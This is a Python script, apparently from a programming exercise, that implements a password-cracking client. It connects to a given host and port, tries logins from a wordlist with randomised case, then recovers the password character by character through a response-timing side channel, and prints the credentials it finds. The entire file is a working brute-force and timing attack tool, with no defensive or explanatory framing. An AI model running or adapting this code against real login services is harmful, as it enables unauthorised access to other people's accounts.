import socket
import sys
from random import choice
import itertools
import json
import time


class PasswordHacker:

    def __init__(self, arg):
        self.hostname = str(arg[1])
        self.port = int(arg[2])
        self.address = (self.hostname, self.port)
        self.login = ''
        self.password = ' '
        self.json_login = {
            "login": "",
            "password": " "
        }
        self.check = 'getLog'

    def connect(self):
        with socket.socket() as client_socket:
            client_socket.connect(self.address)
            while self.check == 'getLog':
                self.get_login(client_socket)
            while self.check == 'getPass':
                self.get_password(client_socket)

    def get_login(self, client_socket):
        with open("./logins.txt", 'r') as file:
            for login in file:
                self.json_login['login'] = ''.join(choice((str.upper, str.lower))(char) for char in login.strip())
                self.send_request(client_socket)

    def get_password(self, client_socket):
        self.json_login['login'] = self.login
        while self.check == 'getPass':
            for guess in itertools.product(map(chr, range(48, 123)), repeat=1):
                self.json_login['password'] = self.password.strip() + ''.join(guess)
                self.send_request(client_socket)

    def send_request(self, client_socket):
        client_socket.send(json.dumps(self.json_login).encode())
        start = time.perf_counter_ns()
        response = client_socket.recv(1024).decode()
        time_spend = time.perf_counter_ns() - start
        self.check_response(json.loads(response), time_spend)

    def check_response(self, response, time_spend):
        if response['result'] == "Wrong password!":
            if time_spend >= 1000000:
                self.password = self.json_login['password']
            else:
                self.check = 'getPass'
                self.login = self.json_login['login']
        elif response['result'] == "Connection success!":
            print(json.dumps(self.json_login))
            exit()


args = sys.argv
hack = PasswordHacker(args)
hack.connect()
